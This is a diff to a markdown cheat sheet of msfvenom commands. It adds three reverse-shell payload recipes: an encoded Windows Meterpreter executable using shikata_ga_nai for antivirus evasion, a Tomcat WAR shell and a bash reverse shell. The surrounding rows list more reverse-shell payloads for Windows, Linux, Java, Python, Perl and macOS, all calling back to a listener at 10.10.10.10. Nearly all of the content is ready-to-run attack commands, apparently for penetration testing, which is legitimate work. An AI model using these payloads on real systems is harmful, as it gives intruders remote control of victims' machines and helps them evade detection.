@@ -65,6 +65,7 @@ Below are some different payload commands. I have grouped them with a heading to
 | Windows Reverse HTTPS Meterpreter | `msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe > shell_https.exe` |
 | Windows Staged Reverse TCP | `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell_stage.exe` |
 | Windows Reverse TCP PowerShell | `msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.ps1` |
+| Windows Executable with Custom Encoder | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded_shell.exe` |
 
 ### Linux Payloads
 
@@ -83,9 +84,12 @@ Below are some different payload commands. I have grouped them with a heading to
 | JSP Reverse TCP | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp` |
 | Python Reverse TCP | `msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.py` |
 | Perl Reverse TCP | `msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 -f raw > shell.pl` |
+| WAR File (Tomcat deployment) | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war > shell.war` |
+| Bash Reverse TCP | `msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f raw > shell.sh` |
 
 ### OSX / macOS Payloads
 
 | Description | Command |
 | --- | --- |
 | macOS Reverse TCP | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f macho > shell.macho` |
+
